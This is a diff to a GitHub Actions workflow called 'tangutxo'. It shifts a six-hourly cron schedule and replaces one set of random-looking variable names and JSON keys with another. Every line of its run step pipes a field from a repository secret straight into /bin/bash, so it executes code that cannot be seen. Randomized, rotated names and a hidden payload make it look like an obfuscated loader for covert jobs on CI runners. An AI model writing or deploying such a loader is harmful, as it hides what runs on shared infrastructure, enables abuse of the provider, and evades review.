@@ -1,29 +1,27 @@
 name: tangutxo
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 3/6 * * *'
-
+    - cron: '18 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: tangutxo
         env:
-          t22: ${{ secrets.t22 }}
+          snuqz7: ${{ secrets.snuqz7 }}
         run: |
-          echo $t22 | jq -r .vdjf918 | /bin/bash
-          echo $ik08707 | jq -r .lf30 | /bin/bash
-          echo $kw51627 | jq -r .wdif27364 | /bin/bash
-          echo $be683 | jq -r .oysh5 | /bin/bash
-          echo $zgn72436 | jq -r .vrl46 | /bin/bash
-          echo $ioula11101 | jq -r .zams73405 | /bin/bash
-          echo $l1 | jq -r .ydom4792 | /bin/bash
-          echo $bc24501 | jq -r .bjqfs8182 | /bin/bash
-          echo $xr9 | jq -r .qt61334 | /bin/bash
-          echo $ogo1175 | jq -r .ecday4 | /bin/bash
-          echo $bqoem0097 | jq -r .yf40 | /bin/bash
+          echo $snuqz7 | jq -r .geldx4989 | /bin/bash
+          echo $sz993 | jq -r .a4 | /bin/bash
+          echo $xqd41901 | jq -r .lxhtf7161 | /bin/bash
+          echo $dxs8 | jq -r .c705 | /bin/bash
+          echo $s48 | jq -r .g53 | /bin/bash
+          echo $w8065 | jq -r .d96556 | /bin/bash
+          echo $kixb65 | jq -r .oasze17484 | /bin/bash
+          echo $uq006 | jq -r .em524 | /bin/bash
+          echo $b39783 | jq -r .tjmxj4520 | /bin/bash
+          echo $fxxl094 | jq -r .quu575 | /bin/bash
+          echo $ty3859 | jq -r .wubxk53493 | /bin/bash
+          echo $juor3 | jq -r .v44 | /bin/bash
 
